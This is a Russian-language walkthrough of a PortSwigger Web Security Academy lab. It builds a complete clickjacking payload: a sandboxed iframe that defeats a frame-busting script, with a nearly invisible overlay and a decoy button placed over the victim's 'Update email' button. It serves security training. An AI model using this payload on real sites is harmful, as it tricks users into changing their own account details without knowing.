Залогинимся под `wiener:peter`

и заметим, что при конфигурации URL можно предзаполнить поле ввода email добавив `?email=test@test.com`
```
https://0add00aa030ee00d80bb582e0039001b.web-security-academy.net/my-account?email=test@test.com
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/1.png)
Перейдем в `Exploit Server` и сконфигурируем пэйлоад

В поле `Body` по аналогии с прошлыми лабораторными работами вставим 
```
<iframe src="https://0add00aa030ee00d80bb582e0039001b.web-security-academy.net/my-account?email=test@test.com></iframe>
```
и нажмем `View exploit` и увидим надпись 
```
This page cannot be framed
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/2.png)

Значит стоит блокировка. Постараемся ее обойти добавив `sandbox="allow-forms"` в тело фрейма, получая
```
<iframe sandbox="allow-forms" src="https://0add00aa030ee00d80bb582e0039001b.web-security-academy.net/my-account?email=test@test.com"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/3.png)

нажмем `View exploit` и увидим, что мы успешно обошли блокировку

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/4.png)

Создаем фальш кнопку стилями, и помещаем ее "поверх" кнопки `Update email`
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div{
        position:absolute;
        top:460px;
        left: 50px;
        z-index: 1;
    }
</style>

<div>CLICK ME BRO</div>
<iframe sandbox="allow-forms" src="https://0add00aa030ee00d80bb582e0039001b.web-security-academy.net/my-account?email=test@test.com"></iframe>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/5.png)

И как это будет выглядеть на стороне жертвы
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/16.%20Clickjacking/3.%20Clickjacking%20with%20a%20frame%20buster%20script/pics%20for%20walkthrough/6.png)



и установим opacity исходной страницы сразу в `0.00001`

нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполненной лабораторной работе
